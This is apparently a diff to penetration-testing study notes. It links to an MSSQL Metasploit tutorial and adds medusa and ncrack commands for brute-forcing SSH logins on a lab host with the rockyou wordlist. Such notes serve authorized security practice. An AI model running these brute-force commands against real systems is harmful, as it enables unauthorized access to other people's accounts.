@@ -19,3 +19,7 @@ FOR MSSQL penetartion testing using msf:
 <href>http://www.hackingarticles.in/mssql-penetration-testing-metasploit/</href>
 
 
+BRUTE force attack commands :
+medusa -U users.txt -P /usr/share/wordlists/rockyou.txt -h 10.11.1.35 -M ssh -f  -e ns
+
+ncrack -p ssh -U users.txt -P /usr/share/wordlists/rockyou.txt -T5 10.11.1.35
